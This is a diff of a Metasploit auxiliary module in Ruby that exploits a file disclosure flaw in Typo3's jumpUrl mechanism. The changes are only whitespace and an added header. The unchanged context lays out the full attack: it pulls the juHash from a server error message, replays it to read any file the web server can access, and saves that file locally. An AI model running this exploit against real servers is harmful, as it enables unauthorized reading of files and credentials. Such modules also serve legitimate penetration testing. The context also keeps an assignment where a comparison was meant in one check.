@@ -1,4 +1,8 @@
 ##
+# $Id$
+##
+
+##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
@@ -18,7 +22,7 @@ class Metasploit3 < Msf::Auxiliary
 				This module exploits a file disclosure vulnerability in the jumpUrl mechanism of
 			Typo3. This flaw can be used to read any file that the web server user account has
 			access to.
-				
+
 			},
 			'Author'         => [ 'spinbad <spinbad.security[at]googlemail.com>' ],
 			'License'        => MSF_LICENSE,
@@ -52,7 +56,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		error_uri = datastore['URI'] + "/index.php?jumpurl=" +datastore['RFILE'] +"&juSecure=1&type=0&locationData=1:"
 		ju_hash = nil
-	
+
 		res = send_request_raw({
 			'uri'     => error_uri,
 			'method'  => 'GET',
@@ -65,24 +69,24 @@ class Metasploit3 < Msf::Auxiliary
 
 		if (res and res.message == "OK")
 			res.body =~ /jumpurl Secure: Calculated juHash, ((\w)+), did not match the submitted juHash./
-			
+
 			if $1.nil?
 				print_error("Error while getting juHash. Maybe the version is already patched...")
 				return
 			end
-			
+
 			ju_hash = $1
 			print_status("Getting juHash from error message: #{ju_hash}")
-			
+
 		else
 			print_error("No response from the server.")
 			return
 		end
-		
-		
+
+
 		file_uri = datastore['URI'] + "/index.php?jumpurl=" +datastore['RFILE'] +"&juSecure=1&type=0&juHash=#{ju_hash}&locationData=1:"
-		print_status("Trying to get #{datastore['RFILE']}.")	
-		
+		print_status("Trying to get #{datastore['RFILE']}.")
+
 		file = send_request_raw({
 			'uri'     => file_uri,
 			'method'  => 'GET',
@@ -92,15 +96,15 @@ class Metasploit3 < Msf::Auxiliary
 				'Connection' => 'Close',
 			}
 		},25)
-		
+
 		if (file and file.message = "OK")
 			if file.body == 'jumpurl Secure: "' + datastore['RFILE'] + '" was not a valid file!'
 				print_error("File #{datastore['RFILE']} does not exist.")
 				return
 			end
-			
+
 			print_status("Writing local file #{datastore['LFILE']}.")
-			open(datastore['LFILE'],'w') {|f| f << file.body } 
+			open(datastore['LFILE'],'w') {|f| f << file.body }
 		else
 			print_error("Error while getting file.")
 		end
